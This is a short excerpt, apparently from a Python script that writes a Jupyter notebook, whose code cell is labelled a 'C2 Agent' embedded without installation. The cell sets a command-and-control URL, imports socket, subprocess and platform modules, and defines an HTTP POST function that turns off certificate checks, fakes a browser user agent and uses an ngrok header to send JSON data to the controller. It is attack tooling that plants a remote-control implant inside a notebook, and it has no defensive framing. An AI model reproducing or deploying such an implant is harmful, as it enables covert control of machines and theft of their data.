                ...
                "cells": [
                    {
                        ...
                        "outputs": [],
                        "source": [
                            "# C2 Agent - embedded directly (no pip install needed)\n",
                            f"import os; os.environ['C2_URL'] = '{c2_url}'\n",
                            "import os,sys,json,time,socket,platform,subprocess,uuid,ssl,hashlib\n",
                            ...
                            "\n",
                            "def http_post(path,data,url=None):\n",
                            "    url=url or C2_URL; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE\n",
                            "    req=Request(f'{url}{path}',data=json.dumps(data).encode(),headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0','ngrok-skip-browser-warning':'true'})\n",
